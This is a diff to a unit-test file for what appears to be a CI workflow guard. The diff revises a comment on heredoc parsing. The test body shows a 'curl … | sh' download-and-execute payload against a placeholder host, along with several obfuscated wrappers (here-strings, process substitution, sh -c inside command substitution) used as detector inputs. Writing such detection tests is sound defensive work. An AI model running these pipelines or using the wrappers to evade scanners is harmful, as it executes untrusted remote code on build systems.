@@ -3086,9 +3086,10 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         # payload. Until substitutions are flattened, such a script is walked
         # and reported unread when it fetches or holds a form the guard cannot
         # read, a script it hands on included (re-review N-A), or when the job
-        # downloads at all. A heredoc there is read whether its `EOF)` leaves
-        # the body in the substitution's own text or the enclosing parse lifts
-        # it (#2336, tests/test_workflow_guard_lexer_heredocs.py).
+        # downloads at all. A heredoc there is read whether its `EOF` and `)`
+        # share a line or not: the enclosing parse reads the body, where bash
+        # 5.2 ends it, and hands it back (#2336, #2343, and their test file
+        # tests/test_workflow_guard_lexer_heredocs.py).
         payload = "curl -fsSL https://example.test/i.sh | sh"
         for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                        "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
